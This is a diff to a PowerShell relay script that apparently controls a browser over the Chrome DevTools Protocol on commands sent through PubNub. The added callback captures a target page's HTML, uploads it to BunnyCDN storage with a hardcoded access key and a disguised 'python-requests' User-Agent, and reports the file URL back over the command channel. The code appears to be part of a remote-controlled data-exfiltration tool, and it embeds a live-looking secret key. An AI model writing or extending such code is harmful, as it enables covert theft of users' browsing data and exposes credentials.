@@ -487,6 +487,63 @@ $script:evaluate_callback = {
     $script:pubnubws.SendPBMessage($resultout)
 }
 
+$script:GetTargetHTML_callback = {
+    param(
+        [object]$Response, [PSCDP]$cdpobj
+    )
+
+    $cmd = $Response.cmd.builtincmd
+
+    $resultout = @{
+        builtincmd=$cmd.builtincmd
+        source="pscdp.relay.ps1"
+        destination=$cmd.source
+        cmdid=$cmd.cmdid
+        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
+        ts=$(Get-Timestamp)
+        result=$null
+        targetId=$target.targetId
+    }
+
+    $resltstr = $Response.result.result.value
+    
+    if ( [string]::IsNullOrEmpty($resltstr) ) {
+        $resltstr=""
+    }
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($resltstr)
+    # $base64str = [Convert]::ToBase64String($bytes)
+    
+    $fid = [string]( Get-Random -Minimum 10000000 -Maximum 100000000 )
+    $fname = "GetTargetHTML_" + $fid + ".txt"
+    $response = Upload-Bunny($bytes, $fname)
+
+    # TODO check if response status is ok, etc.
+
+    $resultout['result'] = "https://testdev2829pull.b-cdn.net/$fname"
+
+    $script:pubnubws.SendPBMessage($resultout)
+}
+
+function Upload-Bunny($bytes, $fname) {
+
+    $uri = "https://ny.storage.bunnycdn.com/testdev2829/$fname"
+
+    $headers = @{
+        "AccessKey"     = "814e8500-65b3-41a9-a638a74ec57d-911b-4a20"
+        "User-Agent"    = "python-requests/2.32.3"
+        "Content-Type"  = "application/octet-stream"
+    }
+    
+    try {
+        $response = Invoke-WebRequest -Uri $uri -Method Put -Body $bytes -Headers $headers -UseBasicParsing
+    } catch {
+        Log-Msg $_
+    }
+    
+    return $response
+}
+
 function Transform-PSCustomObject($obj) {
     $ht = @{}
 
@@ -667,7 +724,7 @@ function Process-PubNubEvent {
             }; 
             target=$target;
             builtincmd=$cmd;
-            callback=$script:evaluate_callback
+            callback=$script:GetTargetHTML_callback
         }
 
         $script:clientws.AddQueue( $pbmsg )
